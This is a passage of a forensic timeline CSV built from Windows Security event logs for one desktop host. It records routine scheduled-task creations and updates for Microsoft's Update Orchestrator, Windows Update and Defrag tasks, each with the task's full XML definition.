&lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,   &lt;/Settings&gt;,   &lt;Actions Context='Author'&gt;,     &lt;Exec&gt;,       &lt;Command&gt;%systemroot%/system32/usoclient.exe&lt;/Command&gt;,       &lt;Arguments&gt;StartWork&lt;/Arguments&gt;,     &lt;/Exec&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4702,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T03:44:35.9217190,Event Time,Event Logs,EZ Tools,A scheduled task was updated,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/UpdateOrchestrator/Schedule Work | TaskContentNew: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;URI&gt;/Microsoft/Windows/UpdateOrchestrator/Schedule Work&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FRFX;;;BA)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;TimeTrigger&gt;,       &lt;StartBoundary&gt;2025-05-03T05:48:35.000Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;/TimeTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id='Author'&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,       &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;Duration&gt;PT10M&lt;/Duration&gt;,       &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;false&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,   &lt;/Settings&gt;,   &lt;Actions Context='Author'&gt;,     &lt;Exec&gt;,       &lt;Command&gt;%systemroot%/system32/usoclient.exe&lt;/Command&gt;,       &lt;Arguments&gt;StartWork&lt;/Arguments&gt;,     &lt;/Exec&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4702,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T03:44:35.9301551,Event Time,Event Logs,EZ Tools,A scheduled task was updated,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/UpdateOrchestrator/Schedule Work | TaskContentNew: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;URI&gt;/Microsoft/Windows/UpdateOrchestrator/Schedule Work&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FRFX;;;BA)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;TimeTrigger&gt;,       &lt;StartBoundary&gt;2025-05-03T05:48:35.000Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;/TimeTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id='Author'&gt;,       &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;Duration&gt;PT10M&lt;/Duration&gt;,       &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;false&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,   &lt;/Settings&gt;,   &lt;Actions Context='Author'&gt;,     &lt;Exec&gt;,       &lt;Command&gt;%systemroot%/system32/usoclient.exe&lt;/Command&gt;,       &lt;Arguments&gt;StartWork&lt;/Arguments&gt;,     &lt;/Exec&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4702,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T03:45:02.5679082,Event Time,Event Logs,EZ Tools,Scheduled Task created,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/Defrag/ScheduledDefrag | TaskContent: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.6' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;$(@%systemroot%/system32/defragsvc.dll,-800)&lt;/Source&gt;,     &lt;Author&gt;$(@%systemroot%/system32/defragsvc.dll,-801)&lt;/Author&gt;,     &lt;Description&gt;$(@%systemroot%/system32/defragsvc.dll,-802)&lt;/Description&gt;,     &lt;SecurityDescriptor&gt;D:AI(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FR;;;AU)&lt;/SecurityDescriptor&gt;,     &lt;URI&gt;/Microsoft/Windows/Defrag/ScheduledDefrag&lt;/URI&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers /&gt;,   &lt;Settings&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;MaintenanceSettings&gt;,       &lt;Period&gt;P7D&lt;/Period&gt;,       &lt;Deadline&gt;P1M&lt;/Deadline&gt;,       &lt;Exclusive&gt;false&lt;/Exclusive&gt;,     &lt;/MaintenanceSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;Hidden&gt;false&lt;/Hidden&gt;,   &lt;/Settings&gt;,   &lt;Principals&gt;,     &lt;Principal id='LocalSystem'&gt;,       &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;,       &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;,       &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Actions Context='LocalSystem'&gt;,     &lt;Exec&gt;,       &lt;Command&gt;%windir%/system32/defrag.exe&lt;/Command&gt;,       &lt;Arguments&gt;-c -h -o -$&lt;/Arguments&gt;,     &lt;/Exec&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4698,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T03:54:36.4001002,Event Time,Event Logs,EZ Tools,A scheduled task was updated,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/WindowsUpdate/Scheduled Start | TaskContentNew: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.4' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;Source&gt;Microsoft Corporation.&lt;/Source&gt;,     &lt;Author&gt;Microsoft Corporation.&lt;/Author&gt;,     &lt;Description&gt;This task is used to start the Windows Update service when needed to perform scheduled operations such as scans.&lt;/Description&gt;,     &lt;URI&gt;/Microsoft/Windows/WindowsUpdate/Scheduled Start&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FA;;;BA)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;TimeTrigger&gt;,       &lt;StartBoundary&gt;2025-05-03T05:30:03Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,       &lt;RandomDelay&gt;PT1M&lt;/RandomDelay&gt;,     &lt;/TimeTrigger&gt;,     &lt;SessionStateChangeTrigger&gt;,       &lt;Enabled&gt;false&lt;/Enabled&gt;,       &lt;StateChange&gt;ConsoleDisconnect&lt;/StateChange&gt;,     &lt;/SessionStateChangeTrigger&gt;,     &lt;SessionStateChangeTrigger&gt;,       &lt;Enabled&gt;false&lt;/Enabled&gt;,       &lt;StateChange&gt;RemoteDisconnect&lt;/StateChange&gt;,     &lt;/SessionStateChangeTrigger&gt;,     &lt;WnfStateChangeTrigger&gt;,       &lt;Enabled&gt;false&lt;/Enabled&gt;,       &lt;StateName&gt;7508BCA3380C960C&lt;/StateName&gt;,       &lt;Data&gt;01&lt;/Data&gt;,       &lt;DataOffset&gt;0&lt;/DataOffset&gt;,     &lt;/WnfStateChangeTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id='LocalSystem'&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,       &lt;UserId&gt;NT AUTHORITY/SYSTEM&lt;/UserId&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;Duration&gt;PT10M&lt;/Duration&gt;,       &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;false&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;false&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;,     &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,   &lt;/Settings&gt;,   &lt;Actions Context='LocalSystem'&gt;,     &lt;Exec&gt;,       &lt;Command&gt;C:/Windows/system32/sc.exe&lt;/Command&gt;,       &lt;Arguments&gt;start wuauserv&lt;/Arguments&gt;,     &lt;/Exec&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4702,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:03:06.0998314,Event Time,Event Logs,EZ Tools,A scheduled task was updated,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/UpdateOrchestrator/Schedule Work | TaskContentNew: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;URI&gt;/Microsoft/Windows/UpdateOrchestrator/Schedule Work&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FRFX;;;BA)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;TimeTrigger&gt;,       &lt;StartBoundary&gt;2025-05-03T04:56:05.000Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;/TimeTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id='Author'&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,       &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;Duration&gt;PT10M&lt;/Duration&gt;,       &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;false&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,   &lt;/Settings&gt;,   &lt;Actions Context='Author'&gt;,     &lt;Exec&gt;,       &lt;Command&gt;%systemroot%/system32/usoclient.exe&lt;/Command&gt;,       &lt;Arguments&gt;StartWork&lt;/Arguments&gt;,     &lt;/Exec&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4702,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:03:06.1845424,Event Time,Event Logs,EZ Tools,A scheduled task was updated,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/UpdateOrchestrator/Schedule Work | TaskContentNew: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;URI&gt;/Microsoft/Windows/UpdateOrchestrator/Schedule Work&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FRFX;;;BA)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;TimeTrigger&gt;,       &lt;StartBoundary&gt;2025-05-03T04:56:05.000Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;/TimeTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id='Author'&gt;,       &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;Duration&gt;PT10M&lt;/Duration&gt;,       &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;false&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,   &lt;/Settings&gt;,   &lt;Actions Context='Author'&gt;,     &lt;Exec&gt;,       &lt;Command&gt;%systemroot%/system32/usoclient.exe&lt;/Command&gt;,       &lt;Arguments&gt;StartWork&lt;/Arguments&gt;,     &lt;/Exec&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4702,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:06:17.4667723,Event Time,Event Logs,EZ Tools,A scheduled task was updated,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/UpdateOrchestrator/Schedule Work | TaskContentNew: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;URI&gt;/Microsoft/Windows/UpdateOrchestrator/Schedule Work&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FRFX;;;BA)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;TimeTrigger&gt;,       &lt;StartBoundary&gt;2025-05-03T05:23:17.000Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;/TimeTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id='Author'&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,       &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;Duration&gt;PT10M&lt;/Duration&gt;,       &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;false&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,   &lt;/Settings&gt;,   &lt;Actions Context='Author'&gt;,     &lt;Exec&gt;,       &lt;Command&gt;%systemroot%/system32/usoclient.exe&lt;/Command&gt;,       &lt;Arguments&gt;StartWork&lt;/Arguments&gt;,     &lt;/Exec&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4702,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:06:17.5258745,Event Time,Event Logs,EZ Tools,A scheduled task was updated,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/UpdateOrchestrator/Schedule Work | TaskContentNew: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;URI&gt;/Microsoft/Windows/UpdateOrchestrator/Schedule Work&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FRFX;;;BA)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;TimeTrigger&gt;,       &lt;StartBoundary&gt;2025-05-03T05:23:17.000Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;/TimeTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id='Author'&gt;,       &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;Duration&gt;PT10M&lt;/Duration&gt;,       &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;false&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,   &lt;/Settings&gt;,   &lt;Actions Context='Author'&gt;,     &lt;Exec&gt;,       &lt;Command&gt;%systemroot%/system32/usoclient.exe&lt;/Command&gt;,       &lt;Arguments&gt;StartWork&lt;/Arguments&gt;,     &lt;/Exec&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4702,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:06:17.7900717,Event Time,Event Logs,EZ Tools,A scheduled task was updated,Security,"Channel: Security | Computer: DESKTOP-704R550 | TaskName: /Microsoft/Windows/UpdateOrchestrator/Schedule Work | TaskContentNew: &lt;?xml version='1.0' encoding='UTF-16'?&gt;, &lt;Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'&gt;,   &lt;RegistrationInfo&gt;,     &lt;URI&gt;/Microsoft/Windows/UpdateOrchestrator/Schedule Work&lt;/URI&gt;,     &lt;SecurityDescriptor&gt;D:P(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FRFX;;;BA)&lt;/SecurityDescriptor&gt;,   &lt;/RegistrationInfo&gt;,   &lt;Triggers&gt;,     &lt;TimeTrigger&gt;,       &lt;StartBoundary&gt;2025-05-03T05:23:17.000Z&lt;/StartBoundary&gt;,       &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;/TimeTrigger&gt;,   &lt;/Triggers&gt;,   &lt;Principals&gt;,     &lt;Principal id='Author'&gt;,       &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;,       &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;,     &lt;/Principal&gt;,   &lt;/Principals&gt;,   &lt;Settings&gt;,     &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;,     &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;,     &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;,     &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;,     &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;,     &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;,     &lt;IdleSettings&gt;,       &lt;Duration&gt;PT10M&lt;/Duration&gt;,       &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;,       &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;,       &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;,     &lt;/IdleSettings&gt;,     &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;,     &lt;Enabled&gt;true&lt;/Enabled&gt;,     &lt;Hidden&gt;false&lt;/Hidden&gt;,     &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;,     &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;,     &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;,     &lt;Priority&gt;7&lt;/Priority&gt;,   &lt;/Settings&gt;,   &lt;Actions Context='Author'&gt;,     &lt;Exec&gt;,       &lt;Command&gt;%systemroot%/system32/usoclient.exe&lt;/Command&gt;,       &lt;Arguments&gt;StartWork&lt;/Arguments&gt;,     &lt;/Exec&gt;,   &lt;/Actions&gt;, &lt;/Task&gt;",,4702,WORKGROUP/DESKTOP-704R550$,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
